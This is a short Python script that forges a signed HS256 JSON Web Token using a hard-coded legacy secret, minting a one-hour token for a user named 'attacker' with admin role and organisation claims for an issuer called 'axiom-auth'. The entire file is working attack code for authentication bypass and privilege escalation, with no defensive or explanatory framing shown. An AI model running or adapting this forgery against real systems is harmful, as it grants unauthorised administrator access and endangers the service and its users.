import base64, hmac, hashlib, json, time, sys

key = 'axiom-auth-hs256-legacy-2019'
now = int(time.time())
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'sub': 'attacker',
    'name': 'Attacker Admin',
    'role': 'admin',
    'org': 'org_admin',
    'iss': 'axiom-auth',
    'iat': now,
    'exp': now + 3600
}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

msg = b64url(json.dumps(header, separators=(',', ':')).encode()) + '.' + b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = b64url(hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest())
token = msg + '.' + sig
print(token)
